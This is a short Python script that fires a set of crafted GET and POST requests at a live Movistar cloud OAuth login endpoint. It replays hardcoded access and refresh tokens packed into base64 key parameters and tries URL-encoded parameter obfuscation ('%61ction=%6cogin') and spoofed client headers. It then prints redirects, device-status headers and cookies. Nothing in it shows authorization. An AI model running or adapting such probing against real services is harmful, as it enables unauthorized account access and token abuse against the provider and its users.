import requests
import json
import base64

access_token = "5a36f383-f6ce-462e-a47f-f26af186c269"
refresh_token = "79451d2d-8d37-4f64-b855-2038226770a3"

b64_acc = base64.b64encode(json.dumps({"data": {"accesstoken": access_token}}).encode()).decode()
b64_both = base64.b64encode(json.dumps({"data": {"accesstoken": access_token, "refreshtoken": refresh_token}}).encode()).decode()

tests = [
    # GET with b64 key
    ("GET b64 web no action", "GET", f"https://micloud.movistar.es/sapi/login/oauth?platform=web&keytype=accesstoken&key={b64_acc}", None),
    ("GET b64 android no action", "GET", f"https://micloud.movistar.es/sapi/login/oauth?platform=android&keytype=accesstoken&key={b64_acc}", None),
    
    # POST with b64 key in URL
    ("POST b64 web no action", "POST", f"https://micloud.movistar.es/sapi/login/oauth?platform=web&keytype=accesstoken&key={b64_acc}", None),
    ("POST b64 android no action", "POST", f"https://micloud.movistar.es/sapi/login/oauth?platform=android&keytype=accesstoken&key={b64_acc}", None),

    # POST with b64 both in URL
    ("POST b64 both web no action", "POST", f"https://micloud.movistar.es/sapi/login/oauth?platform=web&keytype=accesstoken&key={b64_both}", None),
    ("POST b64 both android no action", "POST", f"https://micloud.movistar.es/sapi/login/oauth?platform=android&keytype=accesstoken&key={b64_both}", None),

    # POST with body
    ("POST body web", "POST", "https://micloud.movistar.es/sapi/login/oauth?platform=web&keytype=accesstoken", {"data": {"accesstoken": access_token}}),
    ("POST body android", "POST", "https://micloud.movistar.es/sapi/login/oauth?platform=android&keytype=accesstoken", {"data": {"accesstoken": access_token, "refreshtoken": refresh_token}}),

    # With encoded action=%6cogin
    ("POST b64 web action=login", "POST", f"https://micloud.movistar.es/sapi/login/oauth?%61ction=%6cogin&platform=web&keytype=accesstoken&key={b64_acc}", None),
    ("POST b64 android action=login", "POST", f"https://micloud.movistar.es/sapi/login/oauth?%61ction=%6cogin&platform=android&keytype=accesstoken&key={b64_acc}", None),
]

for name, method, url, body in tests:
    s = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "X-deviceid": "web-test12345"
    }
    if method == "GET":
        r = s.get(url, headers=headers, allow_redirects=False)
    else:
        if body:
            r = s.post(url, headers=headers, json=body, allow_redirects=False)
        else:
            r = s.post(url, headers=headers, allow_redirects=False)
    loc = r.headers.get("Location", "")
    dev = r.headers.get("X-device-status", "")
    print(f"[{name}] -> {r.status_code} | Loc: {loc} | Dev: {dev} | Cookies: {dict(r.cookies)} | Body: {r.text[:100]}")
